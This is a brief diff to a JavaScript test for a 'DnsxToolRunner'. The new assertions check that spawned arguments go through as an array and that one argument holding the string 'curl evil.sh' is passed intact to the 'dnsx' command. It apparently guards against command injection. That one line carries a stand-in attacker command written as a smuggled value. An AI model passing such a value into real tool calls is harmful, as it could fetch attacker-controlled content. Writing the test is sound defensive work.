@@ -44,4 +44,7 @@ describe('DnsxToolRunner', () => {
     });
     const call = spawner.spawn.mock.calls[0][0];
     expect(Array.isArray(call.args)).toBe(true);
-    expect(call.args.filter((a) => a.includes('cu
+    expect(call.args.filter((a) => a.includes('curl evil.sh'))).toHaveLength(1);
+    expect(call.command).toBe('dnsx');
+  });
+});
